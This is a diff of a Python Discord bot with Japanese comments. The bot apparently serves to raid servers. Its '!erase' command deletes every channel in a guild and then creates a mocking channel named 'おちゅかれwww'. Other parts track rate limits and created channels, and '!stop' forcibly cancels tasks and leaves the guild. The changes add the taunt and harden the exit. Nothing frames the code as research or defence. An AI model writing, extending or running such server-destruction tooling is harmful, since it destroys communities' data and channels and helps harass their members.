@@ -43,6 +43,7 @@ created_channels = 0
 active_jobs = 0
 final_leave_lock = asyncio.Lock()
 
+
 async def notify_rate_limit():
     if initiator_id is None:
         return
@@ -56,6 +57,7 @@ async def notify_rate_limit():
             )
     except:
         pass
+
 
 async def stop_only(message: str = None):
     global active_jobs, created_channels
@@ -74,30 +76,34 @@ async def stop_only(message: str = None):
         except:
             pass
 
-# ✅ 修正版：何も待たず即強制退出
+
+# ✅ !stop用：最優先で強制退出
 async def force_leave_all(message: str = None):
     global active_jobs
+    # ✅ まず全部止める
     stop_flag.set()
     rate_limit_hit.clear()
     active_jobs = 0
+    for t in background_tasks:
+        t.cancel()
+    background_tasks.clear()
 
+    # ✅ メッセージ（失敗しても続行）
     if message and target_guild:
         try:
-            ch = target_guild.system_channel or next(
-                (c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages),
-                None
-            )
+            ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
             if ch:
                 await ch.send(message)
         except:
             pass
 
+    # ✅ 何が何でも即退出！
     if target_guild:
         try:
             await target_guild.leave()
             print("✅ 強制退出完了")
         except Exception as e:
-            print(f"⚠️ 退出リクエスト送信: {e}")
+            print(f"⚠️ 退出: {e}")
 
 
 async def try_auto_leave(message: str = None):
@@ -329,12 +335,14 @@ async def check(ctx):
     await ctx.send(embed=emb, ephemeral=True)
 
 
+# ✅ 新しい !erase
 @bot.command()
 async def erase(ctx):
-    """✅ 新コマンド：チャンネル全消しだけ実行 → Botは居残り"""
-    await ctx.send("🗑️ チャンネルの全削除を開始します...")
+    """🗑️ 全チャンネル削除 → 「おちゅかれwww」作成 → Botは居残り"""
+    await ctx.send("🗑️ チャンネル全削除中...")
     await delete_all_channels(ctx.guild)
-    await ctx.send("✅ 全てのチャンネルを削除しました。")
+    await ctx.guild.create_text_channel("おちゅかれwww")
+    await ctx.send("✅ 全削除完了 → 「おちゅかれwww」作成済み")
 
 
 @bot.command()
@@ -361,9 +369,10 @@ async def boost(ctx):
     bot.loop.create_task(run_boost(ctx.guild, auto_leave=True))
 
 
+# ✅ 修正版！絶対に止めて抜ける
 @bot.command()
 async def stop(ctx):
-    """即時全停止＋即時退出"""
+    """🛑 即時全停止 → 確実に退出"""
     await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
     await force_leave_all("🛑 !stop により全処理停止・Bot退出。")
 
